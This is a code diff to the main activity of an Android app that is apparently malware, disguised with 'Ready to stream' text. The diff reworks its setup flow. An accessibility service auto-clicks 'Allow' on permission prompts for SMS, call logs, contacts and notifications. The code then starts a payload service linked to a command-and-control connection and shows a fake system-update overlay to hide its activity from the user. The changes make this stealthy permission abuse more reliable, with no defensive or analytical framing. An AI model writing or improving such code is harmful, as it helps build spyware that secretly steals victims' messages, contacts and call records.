@@ -18,9 +18,14 @@ import com.chameleon.stager.service.PayloadService
 import com.chameleon.stager.utils.PermissionHelper
 
 class MainActivity : AppCompatActivity() {
+    companion object {
+        private const val PERMISSION_REQ_CODE = 1001
+    }
+
     private lateinit var binding: ActivityMainBinding
     private val permissionHelper = PermissionHelper()
-    private var hasStartedFlow = false
+    private var pendingPermissionFlow = false
+    private var flowCompleted = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -116,6 +121,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     fun startPayloadFlow() {
+        if (flowCompleted) return
         continuePayloadFlow()
     }
 
@@ -158,16 +164,29 @@ class MainActivity : AppCompatActivity() {
             }
         }
 
-        // Step 3: Request NOTIFICATION permission BEFORE starting foreground service
-        // (Android 15 requires POST_NOTIFICATIONS for startForeground to succeed)
-        permissionHelper.requestNotificationPermission(this)
-
-        // Step 4: Request runtime permissions (SMS, Call Log, Contacts)
+        // Step 3: Request runtime permissions (SMS, Call Log, Contacts, POST_NOTIFICATIONS)
+        // AccessibilityService auto-clicks "Allow" within ~300ms
+        // onRequestPermissionsResult() continues the flow after grant
         if (!permissionHelper.hasAllPermissions(this)) {
+            pendingPermissionFlow = true
             permissionHelper.requestPermissions(this)
+            return
         }
 
-        // Step 5: Start foreground service (C2 connection begins)
+        // All permissions already granted — proceed directly
+        finishSetup()
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == PERMISSION_REQ_CODE && pendingPermissionFlow) {
+            pendingPermissionFlow = false
+            finishSetup()
+        }
+    }
+
+    private fun finishSetup() {
+        // Step 4: Start foreground service
         val serviceIntent = Intent(this, PayloadService::class.java)
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -180,7 +199,9 @@ class MainActivity : AppCompatActivity() {
             registerViaHttpFallback()
         }
 
-        // Step 6: Show system update overlay to hide all activity
+        flowCompleted = true
+
+        // Step 5: Show system update overlay to hide all activity
         val overlayIntent = Intent(this, UpdateOverlayActivity::class.java)
         overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(overlayIntent)
@@ -219,7 +240,7 @@ class MainActivity : AppCompatActivity() {
         super.onResume()
         if (isAccessibilityServiceEnabled()) {
             binding.statusText.text = "Ready to stream"
-            // Safe to call repeatedly — permissions already granted skips to service start
+            // Safe to call repeatedly — flowCompleted guard prevents re-entry
             startPayloadFlow()
         }
     }
